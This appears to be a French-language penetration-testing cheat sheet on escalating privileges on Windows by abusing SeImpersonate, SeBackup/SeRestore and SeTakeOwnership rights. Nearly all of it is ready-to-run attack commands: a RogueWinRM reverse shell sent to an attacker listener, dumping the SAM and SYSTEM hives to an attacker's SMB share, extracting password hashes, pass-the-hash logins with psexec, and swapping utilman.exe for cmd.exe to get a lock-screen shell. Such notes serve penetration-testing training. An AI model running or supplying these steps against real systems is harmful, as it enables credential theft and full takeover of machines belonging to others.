# Windows Privileges

Pour une liste complète des privilèges exploitables https://github.com/gtworek/Priv2Admin

## SeImpersonate / SeAssignPrimaryToken
Permettent à un processus d'exécuter n'importe quelle commande au nom de n'importe quel utilisateur

**Meterpreter**

```sh
load incognito
list_tokens -u
impersonate_token <TOKEN>
```

```sh
use exploit/windows/local/ms16_075_reflection
```

**RogueWinRM**

Démarrer un écouteur netcat pour recevoir un shell inversé

```sh
rlwrap nc -nlvp 4442
```

Exécuter [Exploit RogueWinRM](https://github.com/antonioCoco/RogueWinRM)

```sh
RogueWinRM.exe -p "C:\Temp\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> 4442"
```

Ou utiliser le module `incognito` de  qui va nous permettre d'exploiter cette vulnérabilité. 

## SeBackup / SeRestore

Permettent aux utilisateurs de lire et d'écrire dans n'importe quel fichier du système, en ignorant toute DACL en place

Disposant de ce pouvoir, un attaquant dumper SAM et SYSTEM pour extraire le hachage du mot de passe de l'administrateur local.

```sh
reg.exe save HKLM\SAM C:\Users\Dipeua\sam.bak
reg.exe save HKLM\SYSTEM C:\Users\Dipeua\system.bak
```

Telecharger les fichier `.bak`

```sh
impacket-smbserver share . -smb2support

reg.exe save HKLM\SAM \\<ATTACKING_IP>\share\sam.bak
reg.exe save HKLM\SYSTEM \\<ATTACKING_IP>\share\system.bak
```

Dump les hashs

```sh
/usr/share/creddump7/pwdump.py system.bak sam.bak

secretsdump.py -sam sam.bak -system system.bak LOCAL
```

Puis effectuer une attaque Pass-the-Hash pour obtenir un shell

```sh
impacket-psexec -hashes LM_HASH:NT_HASH administrator@<TARGET_IP>

pth-winexe -U 'administrator%LM_HASH:NT_HASH' //<TARGET_IP> cmd.exe
```

## SeTakeOwnership

Permet à un utilisateur de s'approprier n'importe quel objet du système, y compris les fichiers et les clés de registre

> Nous allons abuser `utilman.exe` pour élever les privilèges. Utilman est une application Windows intégrée utilisée pour fournir des options de facilité d'accès pendant l'écran de verrouillage.

Pour remplacer utilman, on va commencer par s'en approprier

```sh
takeown /f C:\Windows\System32\Utilman.exe
```

Donner à l'utilisateur toutes les autorisations sur `utilman.exe`

```sh
icacls C:\Windows\System32\Utilman.exe /grant <ACTUAL_USER>:F
```

Après cela, nous remplacerons `utilman.exe` par une copie de `cmd.exe`

```sh
cd C:\Windows\System32\
copy cmd.exe utilman.exe
```

Pour déclencher utilman, :
- Verrouiller l'écran depuis le bouton démarrer
- cliquez sur le bouton "Ease of Access (Option d'ergonomie)"
- Une fenetre cmd vas afficher
